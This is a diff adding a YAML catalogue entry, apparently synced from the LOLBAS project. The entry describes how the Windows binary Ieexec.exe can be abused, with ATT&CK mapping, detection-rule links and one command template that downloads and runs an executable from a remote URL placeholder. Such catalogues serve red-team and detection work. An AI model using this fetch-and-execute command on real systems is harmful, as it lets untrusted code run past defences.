@@ -1,0 +1,33 @@
+id: lolbas/ieexec/execute/1
+type: binary
+platform: windows
+name: Ieexec.exe
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0 (verify upstream LICENSE)
+  upstream_version: 9c5e384
+  last_synced: '2026-08-25'
+attack_techniques:
+- T1218
+opsec:
+  noise: high
+  triggers: Network connections originating from ieexec.exe may be suspicious
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_ieexec_download.yml
+  - https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml
+  - https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_misc_lolbin_connecting_to_the_internet.toml
+  - https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
+commands:
+- template: ieexec.exe {REMOTEURL:.exe}
+  comment: Downloads and executes executable from the remote server.
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Ieexec/
+tags:
+- windows
+- lolbas
